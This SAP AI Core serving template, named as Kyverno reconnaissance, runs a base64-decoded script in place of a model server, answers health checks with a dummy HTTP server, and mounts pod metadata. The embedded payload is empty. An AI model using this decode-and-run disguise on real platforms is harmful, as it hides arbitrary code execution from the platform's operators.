apiVersion: ai.sap.com/v1alpha1
kind: ServingTemplate
metadata:
  name: kyv-recon-v3
  labels:
    scenarios.ai.sap.com/id: "kyv-recon-v3-scenario"
    ai.sap.com/version: "1.0.0"
  annotations:
    scenarios.ai.sap.com/name: "kyv-recon-v3-scenario"
    executables.ai.sap.com/name: "kyv-recon-v3"
    executables.ai.sap.com/description: "Kyverno recon v3 with downward API"
spec:
  template:
    apiVersion: "serving.kserve.io/v1beta1"
    metadata:
      annotations: |
        autoscaling.knative.dev/target: 1
      labels: |
        ai.sap.com/resourcePlan: starter
    spec: |
      predictor:
        minReplicas: 1
        maxReplicas: 1
        containers:
        - name: kserve-container
          image: python:3.11
          command: ["/bin/sh","-c"]
          args:
          - |
            printf '%s' '' | base64 -d > /tmp/p.py
            python3 /tmp/p.py
            python3 -c "
            import http.server
            class H(http.server.BaseHTTPRequestHandler):
              def do_GET(self):
                self.send_response(200); self.end_headers(); self.wfile.write(b'ok')
              def log_message(self,*a): pass
            http.server.HTTPServer(('',8080),H).serve_forever()
            "
          ports:
          - containerPort: 8080
            protocol: TCP
          volumeMounts:
          - name: podinfo
            mountPath: /etc/podinfo
            readOnly: true
        volumes:
        - name: podinfo
          downwardAPI:
            items:
            - path: "annotations"
              fieldRef:
                fieldPath: metadata.annotations
            - path: "labels"
              fieldRef:
                fieldPath: metadata.labels
            - path: "name"
              fieldRef:
                fieldPath: metadata.name
            - path: "namespace"
              fieldRef:
                fieldPath: metadata.namespace
